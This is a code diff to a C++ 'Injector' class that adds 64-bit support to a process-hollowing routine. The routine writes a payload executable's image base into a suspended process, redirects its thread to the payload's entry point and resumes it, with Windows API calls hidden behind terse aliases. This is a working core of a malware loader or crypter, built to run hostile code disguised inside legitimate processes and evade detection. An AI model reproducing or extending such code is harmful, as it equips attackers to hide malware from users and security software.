@@ -134,8 +134,18 @@ void Injector::Inject(LPBYTE lpBuffer) const
 	// Resume the process, which now contains our own executable in its memory space
 	ctc.ContextFlags = CONTEXT_FULL;
 	GC(pi.hThread, &ctc);
-	WM(pi.hProcess, reinterpret_cast<void*>(ctc.Ebx + 8), reinterpret_cast<LPVOID>(&inh->OptionalHeader.ImageBase), sizeof(inh->OptionalHeader.ImageBase), NULL);
+	WM(pi.hProcess,
+#if defined(_X86_)
+	   reinterpret_cast<void *>(ctc.Ebx + 8),
+#elif defined(_AMD64_)
+	   reinterpret_cast<void *>(ctc.Rdx + 16),
+#endif
+	   reinterpret_cast<LPVOID>(&inh->OptionalHeader.ImageBase), sizeof(inh->OptionalHeader.ImageBase), NULL);
+#if defined(_X86_)
 	ctc.Eax = inh->OptionalHeader.ImageBase + inh->OptionalHeader.AddressOfEntryPoint;
+#elif defined(_AMD64_)
+	ctc.Rcx = inh->OptionalHeader.ImageBase + inh->OptionalHeader.AddressOfEntryPoint;
+#endif
 	SC(pi.hThread, &ctc);
 	R(pi.hThread);
 }
